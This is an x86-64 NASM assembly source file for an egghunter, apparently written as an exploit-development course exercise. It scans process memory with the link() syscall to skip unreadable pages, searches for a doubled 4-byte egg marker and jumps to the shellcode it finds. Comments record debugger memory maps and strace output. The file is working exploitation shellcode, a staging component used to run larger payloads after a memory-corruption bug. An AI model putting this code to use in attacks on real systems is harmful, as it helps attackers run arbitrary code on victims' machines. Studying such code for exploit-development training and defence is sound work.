; Filename: eggHunter.nasm
; Author:   boku aka Bobby Cooke
global _start
_start:
 xor rcx, rcx        ; RCX = 0x0
 mul rcx             ; RAX & RDX = 0x0
; Location Shellcode: 0x555555558060
;                     0x555510100000
; gdb-peda$ vmmap
; Start              End                Perm      Name
; 0x0000555555554000 0x0000555555557000 r-xp      /home/beta/git/slae64/3-egghunter/Hunter
; 0x0000555555557000 0x0000555555558000 r-xp      /home/beta/git/slae64/3-egghunter/Hunter
; 0x0000555555558000 0x0000555555559000 rwxp      /home/beta/git/slae64/3-egghunter/Hunter
; 0x0000555555559000 0x000055555557a000 rwxp      [heap]

 add rdx, 0x55551010 ; Start at a higher address (hopefully reduce time)
 shl rdx, 0x10       ; 0x55551010 => 0x555510100000
nextPage:            ; Increment RDX to the next memory page
 or dx, 0xfff        ; 0xfff = 4096. Size of page
nextAddress:         ; Increment RDX to the next memory address
; int link(const char *oldpath, const char *newpath);
 inc rdx
 lea rdi, [rdx+0x8]  ; ARG1=*oldpath
 xor rsi, rsi        ; ARG2=*newpath
 xor rax, rax        ; reset rax for syscall
 add al, 0x56        ; System Call for link()
 syscall             ; Executes link()
; Check if memory page is accessible
 cmp al, 0xf2        ; Can memory address be read?
; strace ./eggHunter
; link(0x1008, NULL)                      = -1 EFAULT (Bad address)
 jz nextPage         ; If no, check the next memory page
 xor rbx, rbx
 add ebx, 0x50905090 ; Configure Egg in RBX
 cmp [rdx], ebx      ; Egg?
 jnz nextAddress     ; No Egg? Go to next memory page
 cmp [rdx+0x4], ebx  ; second Egg?
 jnz nextAddress     ; No Egg? Check next memory address
 jmp rdx             ; EGG FOUND! Jump to Egg!

